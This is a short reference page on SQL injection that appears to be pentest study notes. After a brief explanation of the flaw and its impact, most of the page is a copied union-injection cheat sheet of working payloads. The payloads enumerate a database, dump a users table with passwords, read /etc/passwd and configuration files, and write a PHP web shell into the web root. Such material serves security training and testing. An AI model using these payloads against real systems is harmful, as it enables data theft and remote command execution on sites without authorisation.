# SQL Injection

## SQL injection \(SQLi\) Information

SQL injection is a web security flaw that allows an attacker to interfere with a web application's database queries. It allows an attacker to see data that they wouldn't ordinarily be able to see. This could include data belonging to other users or any other information that the app has access to. In many circumstances, an attacker can change or remove this information.

### Impact

A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. An attacker can sometimes get a persistent backdoor into a company's systems, resulting in a compromise that goes unreported for a long time.

## SQL Union Injection Cheatsheet

This cheat sheet is from [here](https://github.com/areyou1or0/OSCP/blob/master/Web).

```text
# SQL Injection (manual)
photoalbum.php?id=1'

# find the number of columns
photoalbum.php?id=1 order by 8

# Find space to output db
?id=1 union select 1,2,3,4,5,6,7,8

# Get username of the sql-user
?id=1 union select 1,2,3,4,user(),6,7,8

# Get version
?id=1 union select 1,2,3,4,version(),6,7,8

# Get all tables
?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables

# Get all columns from a specific table
?id=1 union select 1,2,3, column_name ,5,6,7,8 from information_schema.columns where table_name=‘users’
?id=1 union select 1,2,3, group_concat(column_name) ,5,6,7,8 from information_schema.columns() where table_name=‘users’
.. 1,2,3, group_concat(user_id, 0x3a, first_name, 0x3a, last_name, 0x3a, email, 0x3a, pass, 0x3a, user_level) ,5,6,7,8 from users

# view files
' union select 1,2,3, load_file(‘/etc/passwd’) ,5,6,7,8 -- -
' union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 -- -
' union select 1,2,3, load_file(‘/var/www/includes/config.inc.php’) ,5,6,7,8 -- -
' union select 1,2,3, load_file(‘/var/www/mysqli_connect.php’) ,5,6,7,8 -- -	

# upload files
' union select 1,2,3, 'this is a test message' ,5,6,7,8 into outfile '/var/www/test'-- -	
' union select 1,2,3, load_file('/var/www/test') ,5,6,7,8 -- -	
' union select null,null,null, "<?php system($_GET['cmd']) ?>" ,5,6,7,8 into outfile '/var/www/shell.php' -- -	
' union select null,null,null, load_file('/var/www/shell.php') ,5,6,7,8 -- -
```



